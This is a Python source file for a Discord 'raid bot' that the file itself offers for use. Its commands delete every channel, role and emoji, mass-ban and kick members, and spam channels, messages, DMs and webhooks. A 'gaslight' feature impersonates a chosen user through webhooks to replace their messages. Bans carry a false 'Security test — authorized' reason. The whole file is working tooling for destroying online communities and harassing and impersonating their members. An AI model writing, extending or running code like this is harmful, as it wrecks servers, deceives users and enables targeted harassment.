import discord
from discord.ext import commands
import asyncio
import random
import string

# ─── CONFIG ──────────────────────────────────────────────────────────
TOKEN = "delete this and put your token here dont worry abt the other commands use the supernuke with  the exclimation mark ONLY"
PREFIX = "!"

# Rate-limit safety: max 3 concurrent API calls, pauses between each
SEM = asyncio.Semaphore(3)
OP_DELAY = 0.35  # seconds between individual operations

# ─── INTENTS ─────────────────────────────────────────────────────────
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents,
                   help_command=None)  # we use custom !raidhelp

# Gaslight state
GAS_TARGET = None     # user ID
GAS_TRIGGER = None    # word to catch (lowercase)
GAS_REPLACE = None    # text to replace with


# ══════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════

async def sd(msg):
    """Safely delete a message."""
    try:
        await msg.delete()
    except:
        pass


async def rate_safe(coro):
    """Execute a coroutine with rate-limit protection."""
    async with SEM:
        try:
            return await coro
        except discord.HTTPException as e:
            if e.status == 429:
                retry = int(e.response.headers.get("Retry-After", 1))
                await asyncio.sleep(retry + 0.5)
            return None
        except:
            return None


async def del_all_channels(guild):
    """Delete every channel in the guild."""
    for ch in guild.channels:
        await rate_safe(ch.delete())
        await asyncio.sleep(OP_DELAY)


async def del_all_roles(guild):
    """Delete all deletable roles."""
    for role in guild.roles:
        if role != guild.default_role and role < guild.me.top_role:
            await rate_safe(role.delete())
            await asyncio.sleep(OP_DELAY)


async def ban_all(guild):
    """Ban every non-bot member."""
    for m in guild.members:
        if m == guild.me:
            continue
        if m.top_role >= guild.me.top_role:
            # Can't ban due to hierarchy — skip silently
            continue
        await rate_safe(m.ban(reason="Security test — authorized"))
        await asyncio.sleep(OP_DELAY)


async def kick_all(guild):
    """Kick every non-bot member."""
    for m in guild.members:
        if m == guild.me:
            continue
        if m.top_role >= guild.me.top_role:
            continue
        await rate_safe(m.kick(reason="Security test — authorized"))
        await asyncio.sleep(OP_DELAY)


async def make_ch(guild, name, msg=None):
    """Create one text channel, optionally send a message."""
    try:
        ch = await rate_safe(guild.create_text_channel(name))
        if msg and ch:
            await rate_safe(ch.send(msg))
            await asyncio.sleep(OP_DELAY)
        return ch
    except:
        return None


async def make_vc(guild, name):
    """Create one voice channel."""
    try:
        return await rate_safe(guild.create_voice_channel(name))
    except:
        return None


async def spam_many(guild, n, name, msg):
    """Create n text channels and post msg in each."""
    for _ in range(n):
        await make_ch(guild, name, msg)
        await asyncio.sleep(OP_DELAY)


async def send_dm(user, content):
    """Send a DM to a user safely."""
    try:
        await rate_safe(user.send(content))
        await asyncio.sleep(OP_DELAY)
    except:
        pass


# ══════════════════════════════════════════════════════════════════════
#  EVENTS
# ══════════════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    print(f"[+] Logged in as {bot.user} (ID: {bot.user.id})")
    print(f"[+] In {len(bot.guilds)} guild(s)")
    for g in bot.guilds:
        print(f"    ─ {g.name} ({g.id})")


@bot.event
async def on_message(msg):
    if msg.author.bot:
        await bot.process_commands(msg)
        return
    await bot.process_commands(msg)

    # ── Gaslight hook ──
    if (GAS_TARGET is not None
            and msg.author.id == GAS_TARGET
            and GAS_TRIGGER
            and GAS_TRIGGER in msg.content.lower()):
        try:
            avatar_bytes = await msg.author.display_avatar.read()
            wh = await msg.channel.create_webhook(
                name=msg.author.display_name,
                avatar=avatar_bytes
            )
            await wh.send(
                GAS_REPLACE,
                username=msg.author.display_name,
                avatar_url=msg.author.display_avatar.url
            )
            await msg.delete()
            await wh.delete()
        except:
            pass


# ══════════════════════════════════════════════════════════════════════
#  COMMANDS (all require Administrator)
# ══════════════════════════════════════════════════════════════════════

# ── 1. NUKE ─────────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """Delete all channels, all roles, ban all members."""
    await sd(ctx.message)
    g = ctx.guild
    await del_all_channels(g)
    await del_all_roles(g)
    await ban_all(g)
    ch = await make_ch(g, "nuked", "Server nuked — all channels, roles, and members removed.")
    if ch:
        await sd(ctx.message) if False else None


# ── 2. SUPER NUKE ───────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def supernuke(ctx):
    """Nuke + 50 JJ channels + 10 extra spam channels."""
    await sd(ctx.message)
    g = ctx.guild
    await del_all_channels(g)
    await del_all_roles(g)
    await ban_all(g)

    # 50 JJ channels
    for _ in range(50):
        await make_ch(g, "JJ", "opps that sucks WOMP WOMP")
        await asyncio.sleep(OP_DELAY)

    # 10 extra random-name channels
    for _ in range(10):
        name = f"rekt-{random.randint(1000, 9999)}"
        msg = random.choice(["L", "RATIO", "OWNED", "SHREDDED", "GG"])
        await make_ch(g, name, msg)
        await asyncio.sleep(OP_DELAY)

    await make_ch(g, "ggwp", "Super nuke complete.")


# ── 3. GASLIGHT ─────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def gaslight(ctx, member: discord.Member, trigger: str, *, replacement: str):
    """
    When <member> says <trigger>, delete their message
    and repost <replacement> via webhook impersonating them.
    Usage: !gaslight @User hello hey there
    """
    global GAS_TARGET, GAS_TRIGGER, GAS_REPLACE
    GAS_TARGET = member.id
    GAS_TRIGGER = trigger.lower()
    GAS_REPLACE = replacement
    await sd(ctx.message)
    conf = await ctx.send(f"🔮 Gaslight active on **{member.display_name}**: "
                          f"`{trigger}` → `{replacement}`")
    await asyncio.sleep(5)
    await sd(conf)


@bot.command()
@commands.has_permissions(administrator=True)
async def stogaslight(ctx):
    """Deactivate gaslight."""
    global GAS_TARGET, GAS_TRIGGER, GAS_REPLACE
    GAS_TARGET = GAS_TRIGGER = GAS_REPLACE = None
    await sd(ctx.message)
    m = await ctx.send("⛔ Gaslight deactivated.")
    await asyncio.sleep(3)
    await sd(m)


# ── 4. MASSBAN ──────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def massban(ctx):
    """Ban every member in the server."""
    await sd(ctx.message)
    await ban_all(ctx.guild)
    m = await ctx.send("✅ Mass ban executed.")
    await asyncio.sleep(3)
    await sd(m)


# ── 5. MASSKICK ─────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def masskick(ctx):
    """Kick every member except the bot."""
    await sd(ctx.message)
    await kick_all(ctx.guild)
    m = await ctx.send("✅ Mass kick executed.")
    await asyncio.sleep(3)
    await sd(m)


# ── 6. DELETECHANNELS ───────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def deletechannels(ctx):
    """Delete ALL channels in the server."""
    await sd(ctx.message)
    await del_all_channels(ctx.guild)
    m = await ctx.send("✅ All channels deleted.")
    await asyncio.sleep(3)
    await sd(m)


# ── 7. SPAMCHANNELS ──────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def spamchannels(ctx, count: int = 50, name: str = "JJ", *, msg: str = "opps that sucks WOMP WOMP"):
    """Create N text channels."""
    await sd(ctx.message)
    await spam_many(ctx.guild, count, name, msg)
    m = await ctx.send(f"✅ Created {count} channels named `{name}`.")
    await asyncio.sleep(3)
    await sd(m)


# ── 8. SPAMMESSAGES ─────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def spammessages(ctx, channel: discord.TextChannel, count: int = 20, *, msg: str = "@everyone GET NUKED"):
    """Spam N messages in a specific text channel."""
    await sd(ctx.message)
    for _ in range(count):
        await rate_safe(channel.send(msg))
        await asyncio.sleep(0.15)
    m = await ctx.send(f"✅ Sent {count} messages in {channel.mention}.")
    await asyncio.sleep(3)
    await sd(m)


# ── 9. DELETEROLES ──────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def deleteroles(ctx):
    """Delete all roles below the bot's highest role."""
    await sd(ctx.message)
    await del_all_roles(ctx.guild)
    m = await ctx.send("✅ All deletable roles removed.")
    await asyncio.sleep(3)
    await sd(m)


# ── 10. RENAMEALL ───────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def renameall(ctx, *, new_name: str = "NUKED_BY_BOT"):
    """Rename every member's nickname."""
    await sd(ctx.message)
    for m in ctx.guild.members:
        if m == ctx.guild.me:
            continue
        if m.top_role >= ctx.guild.me.top_role:
            continue
        try:
            await rate_safe(m.edit(nick=new_name[:32]))
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Renamed all members to `{new_name}`.")
    await asyncio.sleep(3)
    await sd(m)


# ── 11. PMALL ────────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def pmall(ctx, *, message: str):
    """DM every member in the server once (rate-limited)."""
    await sd(ctx.message)
    sent = 0
    for m in ctx.guild.members:
        if m.bot or m == ctx.guild.me:
            continue
        try:
            await send_dm(m, message)
            sent += 1
        except:
            pass
    m = await ctx.send(f"✅ DMed {sent} members.")
    await asyncio.sleep(3)
    await sd(m)


# ── 12. WEBHOOKSPAM ─────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def webhookspam(ctx, channel: discord.TextChannel, count: int = 10, *, msg: str = "webhook raid"):
    """Spam via webhooks (bypasses message rate limits)."""
    await sd(ctx.message)
    for i in range(count):
        try:
            wh = await rate_safe(channel.create_webhook(name=f"raid-{i}"))
            if wh:
                await rate_safe(wh.send(msg))
                await rate_safe(wh.delete())
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Sent {count} webhook messages.")
    await asyncio.sleep(3)
    await sd(m)


# ══════════════════════════════════════════════════════════════════════
#  NEW COMMANDS — ADDED AFTER REQUEST
# ══════════════════════════════════════════════════════════════════════

# ── 13. DMSPAM ──────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def dmspam(ctx, member: discord.Member, count: int = 10, *, message: str = "you got dm raided"):
    """Spam a specific user's DMs N times."""
    await sd(ctx.message)
    sent = 0
    for _ in range(min(count, 50)):  # cap at 50 to avoid total ban
        try:
            await send_dm(member, message)
            sent += 1
        except:
            break
    m = await ctx.send(f"✅ DMed {member.display_name} {sent} times.")
    await asyncio.sleep(3)
    await sd(m)


# ── 14. VCRAID ──────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def vcraid(ctx, count: int = 30, *, name: str = "VOICE RAID"):
    """Create N voice channels."""
    await sd(ctx.message)
    for _ in range(count):
        await make_vc(ctx.guild, name)
        await asyncio.sleep(OP_DELAY)
    m = await ctx.send(f"✅ Created {count} voice channels named `{name}`.")
    await asyncio.sleep(3)
    await sd(m)


# ── 15. THREADRAID ──────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def threadraid(ctx, *, name: str = "THREAD-RAID"):
    """Create a public thread in EVERY text channel."""
    await sd(ctx.message)
    created = 0
    for ch in ctx.guild.text_channels:
        try:
            await rate_safe(ch.create_thread(name=name, type=discord.ChannelType.public_thread))
            created += 1
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Created {created} threads named `{name}`.")
    await asyncio.sleep(3)
    await sd(m)


# ── 16. EMONUKE (emoji delete) ──────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def emonuke(ctx):
    """Delete every custom emoji in the server."""
    await sd(ctx.message)
    deleted = 0
    for emoji in ctx.guild.emojis:
        await rate_safe(emoji.delete())
        deleted += 1
        await asyncio.sleep(OP_DELAY)
    m = await ctx.send(f"✅ Deleted {deleted} custom emojis.")
    await asyncio.sleep(3)
    await sd(m)


# ── 17. LOCKALL ──────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def lockall(ctx):
    """Deny send messages permission for @everyone in all text channels."""
    await sd(ctx.message)
    locked = 0
    for ch in ctx.guild.text_channels:
        try:
            await rate_safe(ch.set_permissions(
                ctx.guild.default_role, send_messages=False))
            locked += 1
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Locked {locked} channels.")
    await asyncio.sleep(3)
    await sd(m)


# ── 18. SLOWMOALL ───────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def slowmoall(ctx, seconds: int = 21600):
    """Set max slowmode (6h default) on all text channels."""
    await sd(ctx.message)
    set_count = 0
    for ch in ctx.guild.text_channels:
        try:
            await rate_safe(ch.edit(slowmode_delay=min(seconds, 21600)))
            set_count += 1
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Set slowmode to {seconds}s on {set_count} channels.")
    await asyncio.sleep(3)
    await sd(m)


# ── 19. SERVEREDIT ──────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def serveredit(ctx, *, name: str = "RAIDED SERVER"):
    """Change the server name."""
    await sd(ctx.message)
    await rate_safe(ctx.guild.edit(name=name[:100]))
    m = await ctx.send(f"✅ Server renamed to `{name}`.")
    await asyncio.sleep(3)
    await sd(m)


# ── 20. CHANNELRENAME ───────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def channelrename(ctx, *, name: str = "raided-channel"):
    """Rename ALL existing channels to the given name."""
    await sd(ctx.message)
    renamed = 0
    for ch in ctx.guild.channels:
        try:
            await rate_safe(ch.edit(name=name[:100]))
            renamed += 1
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Renamed {renamed} channels to `{name}`.")
    await asyncio.sleep(3)
    await sd(m)


# ── 21. ROLENUKE ────────────────────────────────────────────────────
@bot.command()
@commands.has_permissions(administrator=True)
async def rolenuke(ctx, count: int = 50):
    """Create N roles with random colors."""
    await sd(ctx.message)
    created = 0
    for i in range(count):
        color = discord.Color(random.randint(0, 0xFFFFFF))
        try:
            await rate_safe(ctx.guild.create_role(
                name=f"RAID-{random.randint(100, 999)}",
                color=color,
                mentionable=True
            ))
            created += 1
            await asyncio.sleep(OP_DELAY)
        except:
            pass
    m = await ctx.send(f"✅ Created {created} roles.")
    await asyncio.sleep(3)
    await sd(m)


# ── 22. RAIDHELP ────────────────────────────────────────────────────
@bot.command()
async def raidhelp(ctx):
    """Show all 22 raid commands with descriptions."""
    await sd(ctx.message)
    embed = discord.Embed(
        title="💀 RAID BOT — Command Reference (22 commands)",
        description="All destructive commands require **Administrator** permission.",
        color=0xFF1100
    )
    cmds = [
        ("!nuke", "Delete channels, roles, ban all members"),
        ("!supernuke", "Nuke + 50 JJ channels + 10 extra spam channels"),
        ("!gaslight @user trigger replacement", "Webhook-impersonate: catch trigger word → replace"),
        ("!stogaslight", "Stop active gaslight"),
        ("!massban", "Ban every member"),
        ("!masskick", "Kick every member"),
        ("!deletechannels", "Delete all channels"),
        ("!spamchannels [N] [name] [msg]", "Create N text channels with message"),
        ("!spammessages #ch N msg", "Spam N messages in a channel"),
        ("!deleteroles", "Delete all roles below bot"),
        ("!renameall [name]", "Rename all members"),
        ("!pmall <message>", "DM every member once"),
        ("!webhookspam #ch N msg", "Webhook-based message spam"),
        ("!dmspam @user N msg", "DM-spam a specific user"),
        ("!vcraid N [name]", "Create N voice channels"),
        ("!threadraid [name]", "Create threads in all text channels"),
        ("!emonuke", "Delete all custom emojis"),
        ("!lockall", "Deny send perms for @everyone"),
        ("!slowmoall [seconds]", "Max slowmode on all channels"),
        ("!servertedit [name]", "Rename the server"),
        ("!channelrename [name]", "Rename all channels"),
        ("!rolenuke N", "Create N random-colored roles"),
    ]
    for name, desc in cmds:
        embed.add_field(name=name, value=desc, inline=False)
    await ctx.send(embed=embed)


# ══════════════════════════════════════════════════════════════════════
#  RUN
# ══════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    bot.run(TOKEN)